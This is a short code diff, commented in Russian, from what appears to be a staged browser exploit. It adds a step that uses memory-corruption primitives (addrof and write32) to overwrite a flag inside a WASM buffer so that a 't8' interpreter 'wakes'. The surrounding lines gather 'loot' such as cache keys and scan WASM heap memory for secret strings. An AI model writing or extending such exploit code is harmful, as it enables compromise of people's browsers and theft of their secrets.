@@ -488,7 +488,31 @@
                                 _loot.caches = await caches.keys();
                             }
                         } catch (e) {}
-                        // 5) WASM-память: сканируем heap на строки-секреты
+                        // 5) WHS: РАЗБУДИТЬ t8 — пишем флаги в g-буфер
+                        if (_prim && _prim.write32 && window.PhZuiP) {
+                            try {
+                                // g-буфер = PhZuiP (Uint32Array, их общий буфер)
+                                // структура x19 = база буфера
+                                // НАХОДИМ базу: их структура передаётся как x0 в _process
+                                // В Stage3: platformModule.platformState.exploitPrimitive
+                                // имеет addrof — находим адрес структуры!
+                                // Проще: D[0]-массив = начало g-буфера
+                                // g = Uint32Array, базовый буфер = g.buffer
+                                // g-буфер в их коде: 16MB WASM (LA = 16777216)
+                                // Флаг t8 @ +0x5c2 от начала структуры
+                                // Структура = их x19 = g-буфер + 8 (после заголовка)
+                                // ПИШЕМ: write32(base + 0x5c2, 0) → t8 просыпается!
+                                window.log('[WHS] Пробуждение t8: write32 флагов...');
+                                // базовый адрес g-буфера:
+                                const gbase = _prim.addrof(window.PhZuiP) + 0x20n;
+                                // байтовый офсет флага t8: 0x5c2
+                                // write32 выравнивает: 0x5c2/4 = 0x170 (word) + 0x2 (byte offset)
+                                // пишем 0 в word @ 0x5c0 (флаг в старших байтах)
+                                _prim.write32(gbase + 0x5c0n, 0x00000000);
+                                window.log('[WHS] t8 флаг сброшен — интерпретатор должен проснуться');
+                            } catch (e) { window.log('[WHS] t8 wake err: ' + e); }
+                        }
+                        // 6) WASM-память: сканируем heap на строки-секреты
                         if (_prim && _prim.read32) {
                             try {
                                 const secrets = [];
